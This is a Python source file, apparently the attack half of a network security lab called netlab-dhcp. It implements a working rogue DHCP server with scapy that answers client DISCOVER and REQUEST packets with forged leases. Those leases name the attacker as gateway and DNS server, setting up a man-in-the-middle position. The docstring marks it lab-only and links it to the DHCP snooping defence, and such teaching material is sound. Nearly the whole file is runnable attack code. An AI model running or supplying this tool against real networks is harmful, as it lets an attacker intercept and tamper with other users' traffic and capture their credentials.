# SPDX-License-Identifier: MIT
# Copyright (c) 2026 Chris <goabonga@pm.me>

"""Attack side of netlab-dhcp: a rogue DHCP server (MITM). LAB ONLY.

Answers DISCOVER/REQUEST faster than the real server and hands out a gateway
and DNS pointing at the attacker -> man-in-the-middle. This is exactly what
DHCP snooping drops by rejecting server messages on untrusted ports.
"""

from __future__ import annotations

import argparse
from typing import Any

from netlab_core import verdict
from netlab_core.sniffing import load_scapy


class RogueServer:
    def __init__(  # noqa: PLR0913, PLR0917
        self, iface: str, pool_base: str, gateway: str, dns: str, netmask: str, lease: int
    ) -> None:
        scapy = load_scapy()
        self._scapy = scapy
        self.iface = iface
        self.srv_mac = scapy.get_if_hwaddr(iface)
        self.gateway = gateway  # gateway = attacker (the MITM)
        self.dns = dns
        self.netmask = netmask
        self.lease = lease
        self.pool_base = pool_base
        self._next = 100

    def _alloc_ip(self) -> str:
        ip = f"{self.pool_base}{self._next}"
        self._next = 100 if self._next >= 250 else self._next + 1
        return ip

    def _options(self, msg_type: str) -> list[Any]:
        return [
            ("message-type", msg_type),
            ("server_id", self.gateway),
            ("subnet_mask", self.netmask),
            ("router", self.gateway),  # the line that performs the MITM
            ("name_server", self.dns),
            ("lease_time", self.lease),
            "end",
        ]

    def _reply(self, pkt: Any, msg_type: str, offered_ip: str) -> Any:
        s = self._scapy
        return (
            s.Ether(src=self.srv_mac, dst=pkt[s.Ether].src)
            / s.IP(src=self.gateway, dst="255.255.255.255")
            / s.UDP(sport=67, dport=68)
            / s.BOOTP(
                op=2,
                yiaddr=offered_ip,
                siaddr=self.gateway,
                chaddr=pkt[s.BOOTP].chaddr,
                xid=pkt[s.BOOTP].xid,
            )
            / s.DHCP(options=self._options(msg_type))
        )

    def _handle(self, pkt: Any) -> None:
        s = self._scapy
        if not pkt.haslayer(s.DHCP):
            return
        opts = {o[0]: o[1] for o in pkt[s.DHCP].options if isinstance(o, tuple)}
        req = opts.get("message-type")
        if req == 1:  # DISCOVER
            ip = self._alloc_ip()
            verdict("ALERT", f"OFFER {ip} (gw/dns={self.gateway})", context=pkt[s.Ether].src)
            s.sendp(self._reply(pkt, "offer", ip), iface=self.iface, verbose=0)
        elif req == 3:  # REQUEST
            ip = opts.get("requested_addr") or self._alloc_ip()
            verdict("ALERT", f"ACK {ip}", context=pkt[s.Ether].src)
            s.sendp(self._reply(pkt, "ack", ip), iface=self.iface, verbose=0)

    def run(self) -> None:
        print(
            f"[*] rogue DHCP on {self.iface} (mac={self.srv_mac}), "
            f"forged gw/dns={self.gateway}. Ctrl-C to stop."
        )
        self._scapy.sniff(
            iface=self.iface, filter="udp and (port 67 or port 68)", prn=self._handle, store=0
        )


def run(args: argparse.Namespace) -> int:
    RogueServer(
        iface=args.iface,
        pool_base=args.pool_base,
        gateway=args.gateway,
        dns=args.dns or args.gateway,
        netmask=args.netmask,
        lease=args.lease,
    ).run()
    return 0
